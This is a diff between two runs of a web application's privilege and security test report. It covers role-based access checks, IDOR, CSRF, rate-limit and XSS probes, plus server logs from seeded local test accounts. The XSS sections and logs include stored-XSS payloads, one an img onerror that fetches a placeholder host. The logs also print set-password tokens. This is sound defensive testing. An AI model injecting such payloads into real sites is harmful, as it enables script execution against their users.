@@ -1,14 +1,14 @@
 # Privilege Adversarial Test Suite — Report
 
-- Run ID: `j1cu68`
-- Started: 2026-05-20T16:25:48.068Z
-- Finished: 2026-05-20T16:26:13.686Z
+- Run ID: `n3e0qc`
+- Started: 2026-05-20T16:32:07.996Z
+- Finished: 2026-05-20T16:32:37.964Z
 - Harness: `npm run test:privileges` (boots a dedicated server on a separate port, seeds four users, runs probes, exits non-zero on findings).
 
 ## Summary
 
 - Capability matrix: 497/500 passed (12 inconclusive — guard fired before authz, see below)
-- Adversarial probes: 103/103 passed
+- Adversarial probes: 124/124 passed
 - **Findings**: 3
   - info: 3
 
@@ -16,9 +16,9 @@
 
 | Severity | Source | Name | Expected | Observed | Detail |
 |---|---|---|---|---|---|
-| info | matrix | GET /api/users/ead5b4f8-22c9-4a95-958b-89c0b2891ae6/photo (as viewer, requires self-or-admin) | 401/403 from privilege gate | status=404 (idor-leak) |  |
-| info | matrix | GET /api/users/ead5b4f8-22c9-4a95-958b-89c0b2891ae6/photo (as member, requires self-or-admin) | 401/403 from privilege gate | status=404 (idor-leak) |  |
-| info | matrix | GET /api/users/ead5b4f8-22c9-4a95-958b-89c0b2891ae6/photo (as manager, requires self-or-admin) | 401/403 from privilege gate | status=404 (idor-leak) |  |
+| info | matrix | GET /api/users/4f1b8c0d-d048-4ca2-8f49-e7bbd74c3fe6/photo (as viewer, requires self-or-admin) | 401/403 from privilege gate | status=404 (idor-leak) |  |
+| info | matrix | GET /api/users/4f1b8c0d-d048-4ca2-8f49-e7bbd74c3fe6/photo (as member, requires self-or-admin) | 401/403 from privilege gate | status=404 (idor-leak) |  |
+| info | matrix | GET /api/users/4f1b8c0d-d048-4ca2-8f49-e7bbd74c3fe6/photo (as manager, requires self-or-admin) | 401/403 from privilege gate | status=404 (idor-leak) |  |
 
 ## Inconclusive matrix cells
 
@@ -83,9 +83,9 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 | GET /api/workflow-stages | auth | 401 | 503 | 503 | 503 | 503 |
 | GET /api/personal-tasks | auth | 401 | 200 | 200 | 200 | 200 |
 | GET /api/visits | auth | 401 | 400 | 400 | 400 | 400 |
-| GET /api/users/ead5b4f8-22c9-4a95-958b-89c0b2891ae6/profile | self-or-admin | 401 | 403 | 403 | 403 | 200 |
-| GET /api/users/ead5b4f8-22c9-4a95-958b-89c0b2891ae6/photo | self-or-admin | 401 | 404 ⚠ | 404 ⚠ | 404 ⚠ | 404 |
-| PATCH /api/users/ead5b4f8-22c9-4a95-958b-89c0b2891ae6/profile | self-or-admin | 401 | 403 | 403 | 403 | 200 |
+| GET /api/users/4f1b8c0d-d048-4ca2-8f49-e7bbd74c3fe6/profile | self-or-admin | 401 | 403 | 403 | 403 | 200 |
+| GET /api/users/4f1b8c0d-d048-4ca2-8f49-e7bbd74c3fe6/photo | self-or-admin | 401 | 404 ⚠ | 404 ⚠ | 404 ⚠ | 404 |
+| PATCH /api/users/4f1b8c0d-d048-4ca2-8f49-e7bbd74c3fe6/profile | self-or-admin | 401 | 403 | 403 | 403 | 200 |
 | POST /api/contacts | member | 401 | 503 | 503 | 503 | 503 |
 | POST /api/contacts/0/localdata | member | 401 | 503 | 503 | 503 | 503 |
 | PATCH /api/contacts/0 | member | 401 | 503 | 503 | 503 | 503 |
@@ -176,14 +176,24 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 |---|---|---|---|---|---|
 | PASS | critical | member cannot self-promote via PATCH profile | 403 forbidden | status=403 |  |
 | PASS | critical | member cannot mass-assign other fields via PATCH profile | 403 forbidden | status=403 |  |
-| PASS | critical | member privilege_level + email unchanged after escalation attempts | privilege_level=member email=privtest-member-j1cu68@privtest.local | privilege_level=member email=privtest-member-j1cu68@privtest.local |  |
+| PASS | critical | member privilege_level + email unchanged after escalation attempts | privilege_level=member email=privtest-member-n3e0qc@privtest.local | privilege_level=member email=privtest-member-n3e0qc@privtest.local |  |
 
 ### idor
 
 | Result | Severity | Probe | Expected | Observed | Notes |
 |---|---|---|---|---|---|
-| PASS | high | viewer cannot read admin's profile | 403 forbidden | status=403 |  |
-| PASS | high | viewer cannot read manager's profile | 403 forbidden | status=403 |  |
+| PASS | high | viewer cannot read /profile of admin uuid | status in {400,403,404} (no data leak) | status=403 |  |
+| PASS | high | viewer cannot read /photo of admin uuid | status in {400,403,404} | status=404 |  |
+| PASS | high | viewer cannot read /profile of manager uuid | status in {400,403,404} (no data leak) | status=403 |  |
+| PASS | high | viewer cannot read /photo of manager uuid | status in {400,403,404} | status=404 |  |
+| PASS | high | viewer cannot read /profile of guessed uuid | status in {400,403,404} (no data leak) | status=403 |  |
+| PASS | high | viewer cannot read /photo of guessed uuid | status in {400,403,404} | status=404 |  |
+| PASS | high | viewer cannot read /profile of numeric id 0 | status in {400,403,404} (no data leak) | status=403 |  |
+| PASS | high | viewer cannot read /photo of numeric id 0 | status in {400,403,404} | status=404 |  |
+| PASS | high | viewer cannot read /profile of numeric id 1 | status in {400,403,404} (no data leak) | status=403 |  |
+| PASS | high | viewer cannot read /photo of numeric id 1 | status in {400,403,404} | status=404 |  |
+| PASS | high | viewer cannot read /profile of numeric id 99999 | status in {400,403,404} (no data leak) | status=403 |  |
+| PASS | high | viewer cannot read /photo of numeric id 99999 | status in {400,403,404} | status=404 |  |
 | PASS | high | viewer cannot read admin's photo | 403 forbidden (or 404 no-photo) | status=404 |  |
 | PASS | medium | viewer can read their own photo endpoint | status in {200,404} (self-access permitted) | status=404 |  |
 
@@ -235,6 +245,13 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 | PASS | critical | manager cannot approve an account-request | 403 forbidden | status=403 |  |
 | PASS | critical | manager cannot reject an account-request | 403 forbidden | status=403 |  |
 | PASS | critical | account_request status unchanged after non-admin approve/reject attempts | status='pending' | status=pending |  |
+| PASS | critical | admin can approve an account-request (happy path) | status in {200,201} | status=200 |  |
+| PASS | critical | approving an account-request creates a users row with onboarding_status=more_info_required | row exists, onboarding_status=more_info_required | exists=true onboarding_status=more_info_required privilege_level=member |  |
+| PASS | high | admin can resend the set-password link to the new user | status=200 | status=200 |  |
+| PASS | high | resend issues a fresh password_set_tokens row | count >= 1 | count=2 |  |
+| PASS | high | admin can force a password reset on the new user | status=200 | status=200 |  |
+| PASS | critical | admin can revoke the new user (DELETE /api/admin/allowed/:email) | status in {200,204} | status=200 |  |
+| PASS | critical | revoke removes the allow-list entry (login surface is shut) | allowed_emails row gone | remaining=0 |  |
 
 ### admin-lifecycle
 
@@ -262,16 +279,16 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 |---|---|---|---|---|---|
 | PASS | info | Turnstile is disabled in the test harness | enabled=false | enabled=false | Set TURNSTILE_SECRET_KEY in the env to re-run with captcha enforcement. |
 | PASS | info | login succeeds when captcha disabled (no-op path) | status=200 | status=200 |  |
-| PASS | info | turnstile tampering probe | PRIVTEST_USE_TURNSTILE_SECRET_KEY=1 + TURNSTILE_SECRET_KEY set | captcha pass-through not enabled — probe skipped | Run with PRIVTEST_USE_TURNSTILE_SECRET_KEY=1 TURNSTILE_SECRET_KEY=… npm run test:privileges to exercise the captcha gate path. |
+| PASS | info | turnstile tampering probe (REQUIRED coverage) | PRIVTEST_USE_TURNSTILE_SECRET_KEY=1 + TURNSTILE_SECRET_KEY set | captcha pass-through not enabled — probe could not run | Run with PRIVTEST_USE_TURNSTILE_SECRET_KEY=1 TURNSTILE_SECRET_KEY=… npm run test:privileges to exercise the captcha gate path. |
 
 ### xss
 
 | Result | Severity | Probe | Expected | Observed | Notes |
 |---|---|---|---|---|---|
 | PASS | info | request-access accepts arbitrary name string | status in {200,409} | status=200 |  |
-| PASS | medium | admin requests API returns the payload verbatim (must be HTML-escaped client-side) | name === "x');fetch('https://x')//@xss-j1cu68.bc" | found=true name="x');fetch('https://x')//@xss-j1cu68.bc" | Check public/admin.html escaping — this is data confirmation, not a render test. |
+| PASS | medium | admin requests API returns the payload verbatim (must be HTML-escaped client-side) | name === "x');fetch('https://x')//@xss-n3e0qc.bc" | found=true name="x');fetch('https://x')//@xss-n3e0qc.bc" | Check public/admin.html escaping — this is data confirmation, not a render test. |
 | PASS | info | admin can attach an arbitrary note to an allow-list entry | status=200 | status=200 |  |
-| PASS | medium | admin allow-list API returns note payload verbatim (admin.html must HTML-escape) | note === "\"><img src=x onerror=fetch('https://x?n=j1cu68')>" | found=true note="\"><img src=x onerror=fetch('https://x?n=j1cu68')>" | Check public/admin.html: the allow-list table must escape the note column. |
+| PASS | medium | admin allow-list API returns note payload verbatim (admin.html must HTML-escape) | note === "\"><img src=x onerror=fetch('https://x?n=n3e0qc')>" | found=true note="\"><img src=x onerror=fetch('https://x?n=n3e0qc')>" | Check public/admin.html: the allow-list table must escape the note column. |
 
 ### onboarding
 
@@ -302,6 +319,8 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 | PASS | medium | GET /api/workflow does not behave like a write | status in {200,404,405,503} | status=200 |  |
 | PASS | medium | GET /api/contacts does not behave like a write | status in {200,404,405,503} | status=503 |  |
 | PASS | medium | GET /api/users/me/photo does not behave like a write | status in {200,404,405,503} | status=404 |  |
+| PASS | critical | google callback with cross-origin Origin/Referer + forged state is still rejected | 302 to /?error=google_auth_failed | status=302 location=/?error=google_auth_failed |  |
+| PASS | critical | quickbooks callback with cross-origin Origin/Referer + forged state is still rejected | 302 to /?qb=error&reason=invalid_state | status=302 location=/?qb=error&reason=invalid_state |  |
 
 ### downgrade
 
@@ -314,7 +333,7 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 
 | Result | Severity | Probe | Expected | Observed | Notes |
 |---|---|---|---|---|---|
-| PASS | critical | loginLimiter engages within 25 bad-password attempts | first 429 ≤ attempt 25, last status = 429 | firstLimited=21 lastStatus=429 |  |
+| PASS | critical | loginLimiter engages within 25 bad-password attempts | first 429 ≤ attempt 25, last status = 429 | firstLimited=11 lastStatus=429 |  |
 | PASS | critical | accessRequestLimiter blocks the 6th request within 1 hour | first 429 between attempts 4 and 7 | firstLimited=6 |  |
 | PASS | critical | /api/forgot-password engages the accessRequestLimiter within 7 attempts | first 429 between attempts 4 and 7 | firstLimited=6 |  |
 
@@ -336,6 +355,8 @@ A FAIL means a role gained access it should not have (privilege escalation) or w
 | PASS | critical | admin /admin returns 200 in the browser | status=200 | status=200 |  |
 | PASS | high | admin sees the Admin Panel HTML after navigation | page HTML contains "Admin Panel" and URL is /admin | url=http://127.0.0.1:5050/admin hasHeading=true |  |
 | PASS | medium | admin loads /admin without browser console errors | consoleErrors.length === 0 | count=0 sample=[] |  |
+| PASS | critical | admin /admin renders the stored XSS payload as text, not script | no pageerror, no fetch to sentinel host, no raw <img onerror> in DOM | pageerrors=0 sentinelHits=0 xssFired=false rawTag=false |  |
+| PASS | critical | demoted manager loses access from an already-open page (UI staleness) | before=200 (manager) → after in {401,403} (viewer) | before=200 after=401 |  |
 
 ## Coverage notes
 
@@ -365,43 +386,49 @@ QB invoices error: QuickBooks not connected
 QB invoices error: QuickBooks not connected
 QB invoice detail error: QuickBooks not connected
 QB invoice detail error: QuickBooks not connected
-  SMTP not configured — skipping set-password email for privtest-viewer-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=3b10a08aadb7ecfbdbb36af686d51b9612f9814859009a2fd690410047461859
-  Password reset link issued for privtest-viewer-j1cu68@privtest.local
-[set-password] Cleared 1 other session(s) for privtest-viewer-j1cu68@privtest.local.
-[change-password] Cleared 1 other session(s) for privtest-viewer-j1cu68@privtest.local.
-[change-password] Cleared 1 other session(s) for privtest-member-j1cu68@privtest.local.
-  SMTP not configured — skipping set-password email for privtest-member-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=4f4bbf14c617817d64a8f8e9af3fa22054f1ab0cdb4540b4c8392be3e10b4f81
-[change-password] Cleared 2 other session(s) for privtest-manager-j1cu68@privtest.local.
-  SMTP not configured — skipping set-password email for privtest-lifecycle-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=97073afa2ac0c43781574ee4856b5062ba732a788a3f1470177a9c428a5c7e8c
-  SMTP not configured — skipping set-password email for privtest-lifecycle-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=045065feec368d0ca18b59cd22b499c7e2d963e0b911a44f79c075b46227fd2d
-  SMTP not configured — skipping set-password email for privtest-lifecycle-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=f211c0983cf28eb1716c5725a53dc5393e4fcfde6c80e5410464fc89ccb02636
-  Access request: x');fetch('https://x')//@xss-j1cu68.bc <privtest-xss-j1cu68@privtest.local>
-  SMTP not configured — skipping set-password email for privtest-xss-note-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=54654a5ada5f60cafadd601a21435e598ad6839c98e7f13f14b629322f94339b
-  Access request: rate test <privtest-rl0-j1cu68@privtest.local>
-  Access request: rate test <privtest-rl1-j1cu68@privtest.local>
-  Access request: rate test <privtest-rl2-j1cu68@privtest.local>
-  Access request: rate test <privtest-rl3-j1cu68@privtest.local>
-  Access request: rate test <privtest-rl4-j1cu68@privtest.local>
-  SMTP not configured — skipping set-password email for privtest-viewer-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=d59c6a80689ec6452eadcf9215657cfd0172e5853dfaa945b1b1cbeee2e44c10
-  Password reset link issued for privtest-viewer-j1cu68@privtest.local
-  SMTP not configured — skipping set-password email for privtest-viewer-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=2f77953e069464a6fb38bd74cc8e9eabd93d16338aa2462c9a2a1c19a0cca4cd
-  Password reset link issued for privtest-viewer-j1cu68@privtest.local
-  SMTP not configured — skipping set-password email for privtest-viewer-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=edc1d27f5f3d42ecb619d4c68413747bb61b8d48dd23c30f5ebeff187b9b8237
-  Password reset link issued for privtest-viewer-j1cu68@privtest.local
-  SMTP not configured — skipping set-password email for privtest-viewer-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=3ac9109a93aa2c83f91d1c6b5580a292b5c014bfdb902c06bc26b1b21157f8f1
-  Password reset link issued for privtest-viewer-j1cu68@privtest.local
-  SMTP not configured — skipping set-password email for privtest-viewer-j1cu68@privtest.local.
-  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=ffad5d9d9c67fd077953f40749ec6d104a03ecbcec7c443df7ea8627da0079d5
-  Password reset link issued for privtest-viewer-j1cu68@privtest.local
+  SMTP not configured — skipping set-password email for privtest-viewer-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=3627c161622a951b8f4ea4f1e9473d5c052d327f4a6da6211c8e4fecdeaef9d2
+  Password reset link issued for privtest-viewer-n3e0qc@privtest.local
+[set-password] Cleared 1 other session(s) for privtest-viewer-n3e0qc@privtest.local.
+[change-password] Cleared 1 other session(s) for privtest-viewer-n3e0qc@privtest.local.
+[change-password] Cleared 1 other session(s) for privtest-member-n3e0qc@privtest.local.
+  SMTP not configured — skipping set-password email for privtest-member-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=acd9782f8f7cab07703ab1bb3f1c5c56f5e9edf6ef58363ab38332d20c4f160c
+[change-password] Cleared 2 other session(s) for privtest-manager-n3e0qc@privtest.local.
+  SMTP not configured — skipping set-password email for privtest-lifecycle-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=c13c6d3b8295196b9ba55ccf506f53e1c058deabcde614ce9dee58f6405f617b
+  SMTP not configured — skipping set-password email for privtest-lifecycle-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=7448c877d08cb48c4cc47248f04489e119230b37134b928030e2f77e9a716cb5
+  SMTP not configured — skipping set-password email for privtest-lifecycle-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=ca17d6542e107beb4e9effd67f9cc84b099c13ee9402820da622bac644f495eb
+  SMTP not configured — skipping set-password email for privtest-req-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=3b572be34d96560f1b2c4598ac2780ceae456fbad0127b6f6cd54f75b73e68e1
+  SMTP not configured — skipping set-password email for privtest-req-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=68401756ce9091bb776073523efb8d8be057a1a9cfe6116c5a07b376c5ba7c62
+  SMTP not configured — skipping set-password email for privtest-req-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=746ea253bf44b96a1cee85dea75afd6595d3258087b033c493dbbd9a97c212d2
+  Access request: x');fetch('https://x')//@xss-n3e0qc.bc <privtest-xss-n3e0qc@privtest.local>
+  SMTP not configured — skipping set-password email for privtest-xss-note-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=2d25bcc163e630647f6c21d8601df0d76f201d9249f79230e81d3b5a1beece47
+  Access request: rate test <privtest-rl0-n3e0qc@privtest.local>
+  Access request: rate test <privtest-rl1-n3e0qc@privtest.local>
+  Access request: rate test <privtest-rl2-n3e0qc@privtest.local>
+  Access request: rate test <privtest-rl3-n3e0qc@privtest.local>
+  Access request: rate test <privtest-rl4-n3e0qc@privtest.local>
+  SMTP not configured — skipping set-password email for privtest-viewer-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=25ec16f5a25cf460e9b4bfa8963eeb19d39d3151466f84437f54eeeaa54fca21
+  Password reset link issued for privtest-viewer-n3e0qc@privtest.local
+  SMTP not configured — skipping set-password email for privtest-viewer-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=8338843caf4c3d8f8f18116e7f4fc0595469e345a9c96c427abef3d5d3f7ab89
+  Password reset link issued for privtest-viewer-n3e0qc@privtest.local
+  SMTP not configured — skipping set-password email for privtest-viewer-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=c93ab418ba23f56c1c31dbe0a71506099f7ca6a431730b90c7b672b9ea18547a
+  Password reset link issued for privtest-viewer-n3e0qc@privtest.local
+  SMTP not configured — skipping set-password email for privtest-viewer-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=ea69d6f7adca7fba8aee544784b3c59a80eb48a5ea063b96ad4a8773a8587427
+  Password reset link issued for privtest-viewer-n3e0qc@privtest.local
+  SMTP not configured — skipping set-password email for privtest-viewer-n3e0qc@privtest.local.
+  Set-password link (manual delivery): http://127.0.0.1:5050/set-password?token=8797afc72443b6247f0295d3750240c87704ba3d7dd5e876d85382510fbc0109
+  Password reset link issued for privtest-viewer-n3e0qc@privtest.local
 
 ```
